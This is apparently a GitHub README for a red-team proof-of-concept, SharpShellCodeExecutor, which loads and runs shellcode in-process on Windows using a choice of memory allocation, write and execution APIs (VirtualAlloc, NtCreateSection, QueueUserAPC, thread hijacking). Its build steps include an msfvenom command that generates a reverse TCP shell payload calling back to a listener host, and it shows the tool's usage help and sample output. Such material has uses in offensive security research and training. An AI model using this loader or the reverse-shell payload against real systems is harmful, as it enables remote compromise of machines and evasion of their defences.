# SharpShellCodeExecutor
A POC that shows different methods of executing shellcode within the same process.

It allows specifying different options for the three steps needed to execute shellcode (in most cases).
1. Allocate memory with RWX permissions. This can be done using the Win32 API's VirtualAlloc, VirtualAllocEx, VirtualAllocExNuma , WriteProcessMemory or the native API's NtCreateSection/NtMapSectionView.
2. Write shellcode to newly allocated memory. This can be done using the API's RtlMovememory, WriteProcessMemory or via Marshal.Copy.
3. Execute. This can be done via Classic (CreateThread), Delegate (using Delegate + Function Pointers), LocalThread Highjacking (creating a new thread and pointing it's RIP to the place where the RWX shellcode is stored or using the APC User Queue + NtTestAlert.

## How to compile
First generate shellcode using msfvenom (or any other method) as a C# byte array with the variable name being shellCode.
Example:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.105 LPORT=80 -f csharp -v shellCode

And replace the variable at Program.cs (line 10) and add the static keyword to the beginning, e.g.:

 static byte[] shellCode = new byte[460] {
            0xfc,... 
            };

Then use Visual Studio to build the project.

## How to run

Run the executeable and optionally specify the following arguments to specify the memory allocation, write and execution method.
```
ShellCodeExecutor.exe -h
ShellCodeExecutor.exe: Executes shellcode stored in shellCode variable within the same process, allows specifying the memory allocation, shellcode writing method and shellcode execution method
Arguments
         -a <Allocation_Method>: Specifies which allocation method to use. Available choices:  VirtualAlloc (Default), VirtualAllocEx, VirtualAllocExNuma, NtCreateSection
         -h : Show help menu.
         -s <ShellCode_Execution_Method>: Specifies which shellcode execution method to use. Available choices:  Classic (Default), Delegate, LocalThreadHighjack, QueueUserAPC
         -w <Write_Method>: Specifies which write method to use when writing shellcode to memory. Available choices:  WriteProcessMemory (Default), MarshalCopy, RtlMoveMemory
```
## Example run
```
ShellCodeExecutor.exe -a VirtualAllocEx -s QueueUserAPC -w RtlMoveMemory
[+] Using selected Allocation VirtualAllocEx, Write Method RtlMoveMemory, Shellcode Exexution QueueUserAPC
[+] Allocating Memory
[+] Writing Shellcode to Memory
[+] Executing Memory
```
